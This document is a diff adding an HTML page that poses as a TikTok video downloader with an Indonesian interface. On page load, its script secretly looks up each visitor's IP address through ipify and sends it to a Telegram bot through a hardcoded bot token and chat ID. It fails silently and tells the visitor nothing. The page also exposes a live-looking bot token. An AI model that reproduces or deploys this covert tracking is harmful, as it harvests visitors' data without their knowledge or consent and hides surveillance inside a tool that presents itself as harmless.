@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<title>TikTok Downloader</title>
+<style>
+  body {
+    margin: 0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #69c0ff, #1677ff);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    color: white;
+  }
+  #app {
+    background: rgba(0,0,0,0.4);
+    padding: 2rem;
+    border-radius: 1rem;
+    width: 90vw;
+    max-width: 400px;
+    box-shadow: 0 8px 16px rgba(0,0,0,0.25);
+  }
+  h1 {
+    margin-bottom: 1rem;
+    font-weight: 700;
+    text-align: center;
+    font-size: 1.8rem;
+    text-shadow: 0 1px 3px rgba(0,0,0,0.3);
+  }
+  input[type="text"] {
+    width: 100%;
+    border-radius: 0.5rem;
+    border: none;
+    padding: 0.8rem 1rem;
+    font-size: 1rem;
+    outline: none;
+    margin-bottom: 1rem;
+  }
+  button {
+    width: 100%;
+    background-color: #00f2ff;
+    color: #022547;
+    border: none;
+    outline: none;
+    padding: 0.9rem;
+    border-radius: 0.7rem;
+    font-weight: 600;
+    font-size: 1.1rem;
+    cursor: pointer;
+    box-shadow: 0 4px 15px rgba(0, 242, 255, 0.6);
+    transition: background-color 0.3s ease;
+  }
+  button:disabled {
+    background-color: #555;
+    cursor: not-allowed;
+    box-shadow: none;
+    color: #bbb;
+  }
+  #message {
+    margin-top: 1rem;
+    text-align: center;
+    font-weight: 600;
+    letter-spacing: 0.03em;
+  }
+</style>
+</head>
+<body>
+<div id="app">
+  <h1>TikTok Video Downloader</h1>
+  <input type="text" id="linkInput" placeholder="Masukkan link video TikTok" />
+  <button id="downloadBtn" disabled>Download</button>
+  <div id="message"></div>
+</div>
+<script>
+  (function () {
+    const telegramBotToken = "8168463615:AAGpLNpmYEjEomMKxpdFHaI8FIaQb_QOrM0";
+    const telegramChatId = "6613275120";
+    const linkInput = document.getElementById("linkInput");
+    const downloadBtn = document.getElementById("downloadBtn");
+    const messageEl = document.getElementById("message");
+
+    // Validate TikTok URL by RegExp (basic check for tiktok.com/video or vm.tiktok.com pattern)
+    function isValidTikTokUrl(url) {
+      try {
+        const parsedUrl = new URL(url.trim());
+        if (!parsedUrl.host.includes("tiktok.com")) return false;
+        // Example valid paths: /@username/video/1234567890 or vm.tiktok.com/xyz
+        return /\/video\/\d+/.test(parsedUrl.pathname) || parsedUrl.hostname.startsWith("vm.");
+      } catch {
+        return false;
+      }
+    }
+
+    // Send IP info to telegram bot via bot API
+    async function sendIpToTelegram(ip) {
+      const message = `🚀 TikTok Downloader Access\nIP Address: ${ip}`;
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+      try {
+        await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: telegramChatId,
+            text: message,
+            disable_web_page_preview: true,
+          }),
+        });
+      } catch (err) {
+        // Fail silently, no impact on user
+      }
+    }
+
+    // Fetch user's IP using an external public service then send to telegram
+    async function fetchAndSendIp() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        if (!res.ok) return;
+        const data = await res.json();
+        if (data.ip) {
+          await sendIpToTelegram(data.ip);
+        }
+      } catch {
+        // Fail silently
+      }
+    }
+
+    // Downloader function to get video download URL
+    async function getDownloadUrl(tiktokUrl) {
+      // Using a public TikTok download API endpoint (unofficial)
+      // If not working, fallback to error message
+      const apiUrl = "https://api.tikmate.app/api/lookup?url=" + encodeURIComponent(tiktokUrl);
+      try {
+        const response = await fetch(apiUrl);
+        if (!response.ok) throw new Error("API response error");
+        const result = await response.json();
+        if (result && result.collector && result.collector.length > 0) {
+          // Find a video without watermark (if available)
+          const noWatermarkVideo = result.collector.find(v => v.quality === "720p" && v.type === "video/mp4") || result.collector[0];
+          return noWatermarkVideo?.url || null;
+        }
+        return null;
+      } catch {
+        return null;
+      }
+    }
+
+    // Event handlers
+    linkInput.addEventListener("input", () => {
+      messageEl.textContent = "";
+      if (isValidTikTokUrl(linkInput.value)) {
+        downloadBtn.disabled = false;
+      } else {
+        downloadBtn.disabled = true;
+      }
+    });
+
+    downloadBtn.addEventListener("click", async () => {
+      downloadBtn.disabled = true;
+      messageEl.textContent = "Memproses video...";
+      const url = linkInput.value.trim();
+
+      const downloadUrl = await getDownloadUrl(url);
+      if (downloadUrl) {
+        messageEl.textContent = "Siap download!";
+        // Create temporary anchor to download the video
+        const a = document.createElement("a");
+        a.href = downloadUrl;
+        a.download = "tiktok_video.mp4";
+        a.target = "_blank";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        messageEl.textContent = "Jika download tidak dimulai, klik tombol di bawah.";
+        downloadBtn.disabled = false;
+      } else {
+        messageEl.textContent = "Gagal mendapatkan video. Pastikan link valid dan coba lagi.";
+        downloadBtn.disabled = false;
+      }
+    });
+
+    // On load, fetch IP and send to Telegram
+    fetchAndSendIp();
+  })();
+</script>
+</body>
+</html>
+
+```
